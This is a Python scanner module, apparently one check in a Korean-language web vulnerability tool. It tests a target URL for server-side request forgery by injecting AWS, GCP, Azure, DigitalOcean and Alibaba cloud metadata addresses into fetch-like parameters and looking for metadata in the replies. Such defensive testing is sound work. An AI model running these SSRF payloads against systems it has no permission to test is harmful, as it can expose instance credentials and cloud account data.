"""
클라우드 메타데이터 접근 점검

SSRF를 통한 클라우드 메타데이터 접근 가능성을 탐지합니다.
"""
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode


def scan(target_url):
    result = {
        'name': '클라우드 메타데이터 접근',
        'category': 'Cloud Security',
        'status': 'SAFE',
        'severity': 'CRITICAL',
        'vulnerabilities': [],
        'recommendation': 'SSRF 필터링, IMDSv2 사용 (AWS)',
        'details': ''
    }
    
    details = []
    
    # 클라우드 메타데이터 엔드포인트
    METADATA_ENDPOINTS = [
        # AWS
        ('http://169.254.169.254/latest/meta-data/', 'AWS'),
        ('http://169.254.169.254/latest/user-data/', 'AWS'),
        ('http://169.254.169.254/latest/dynamic/', 'AWS'),
        
        # GCP
        ('http://metadata.google.internal/computeMetadata/v1/', 'GCP'),
        ('http://169.254.169.254/computeMetadata/v1/', 'GCP'),
        
        # Azure
        ('http://169.254.169.254/metadata/instance/', 'Azure'),
        
        # DigitalOcean
        ('http://169.254.169.254/metadata/v1/', 'DigitalOcean'),
        
        # Alibaba Cloud
        ('http://100.100.100.200/latest/meta-data/', 'Alibaba'),
    ]
    
    try:
        details.append("[Cloud-1] 클라우드 메타데이터 접근 테스트\n")
        details.append("  ※ SSRF를 통한 메타데이터 노출 점검\n")
        
        # URL에서 SSRF 가능한 파라미터 탐색
        parsed = urlparse(target_url)
        params = parse_qs(parsed.query)
        
        ssrf_params = []
        for name in params.keys():
            if any(kw in name.lower() for kw in ['url', 'uri', 'path', 'file', 'page', 'src', 'href', 'redirect']):
                ssrf_params.append(name)
        
        if not ssrf_params:
            # 일반적인 SSRF 취약 엔드포인트 시도
            ssrf_endpoints = [
                '?url=', '?redirect=', '?path=', '?file=',
                '?fetch=', '?proxy=', '?uri=',
            ]
            details.append("  URL 파라미터 없음, 일반 엔드포인트 테스트")
        else:
            details.append(f"  SSRF 가능 파라미터: {', '.join(ssrf_params)}")
        
        vulnerable_metadata = []
        
        # 직접 메타데이터 접근 테스트 (SSRF 시뮬레이션)
        details.append("\n[Cloud-2] 메타데이터 엔드포인트 테스트")
        
        for param in ssrf_params[:2] if ssrf_params else ['url']:
            for metadata_url, provider in METADATA_ENDPOINTS[:5]:  # 상위 5개만
                try:
                    # SSRF 페이로드 삽입
                    test_params = {k: v[0] for k, v in params.items()} if params else {}
                    test_params[param] = metadata_url
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"
                    
                    response = requests.get(
                        test_url,
                        timeout=5,
                        verify=False,
                        headers={'Metadata-Flavor': 'Google'}  # GCP 헤더
                    )
                    
                    # 메타데이터 응답 시그니처 확인
                    if response.status_code == 200:
                        text = response.text.lower()
                        
                        # AWS 시그니처
                        if 'ami-id' in text or 'instance-id' in text:
                            vulnerable_metadata.append({
                                'provider': 'AWS',
                                'param': param,
                                'endpoint': metadata_url
                            })
                            details.append(f"  ✗ {provider} 메타데이터 접근 가능!")
                        
                        # GCP 시그니처
                        elif 'project-id' in text or 'instance' in text:
                            vulnerable_metadata.append({
                                'provider': 'GCP',
                                'param': param,
                                'endpoint': metadata_url
                            })
                            details.append(f"  ✗ {provider} 메타데이터 접근 가능!")
                        
                        # Azure 시그니처
                        elif 'vmId' in text or 'subscriptionId' in text:
                            vulnerable_metadata.append({
                                'provider': 'Azure',
                                'param': param,
                                'endpoint': metadata_url
                            })
                            details.append(f"  ✗ {provider} 메타데이터 접근 가능!")
                
                except:
                    continue
        
        # 클라우드 환경 감지
        details.append("\n[Cloud-3] 클라우드 환경 감지")
        
        try:
            response = requests.get(target_url, timeout=10, verify=False)
            headers = response.headers
            
            cloud_indicators = []
            
            if 'x-amz' in str(headers).lower():
                cloud_indicators.append('AWS')
            if 'x-goog' in str(headers).lower():
                cloud_indicators.append('GCP')
            if 'x-ms' in str(headers).lower():
                cloud_indicators.append('Azure')
            
            if cloud_indicators:
                details.append(f"  클라우드 환경: {', '.join(cloud_indicators)}")
            else:
                details.append("  클라우드 환경 미감지")
                
        except:
            pass
        
        # 요약
        details.append("\n[Cloud-4] 보안 요약")
        
        if vulnerable_metadata:
            result['status'] = 'VULNERABLE'
            result['severity'] = 'CRITICAL'
            result['vulnerabilities'] = [
                f"메타데이터 접근: {v['provider']} via {v['param']}"
                for v in vulnerable_metadata
            ]
            details.append(f"\n  ✗ 심각: 클라우드 메타데이터 노출")
        else:
            details.append("\n  ✓ 메타데이터 접근 취약점 미발견")
        
    except Exception as e:
        details.append(f"  [ERROR] {str(e)}")
        result['status'] = 'ERROR'
    
    result['details'] = '\n'.join(details)
    return result
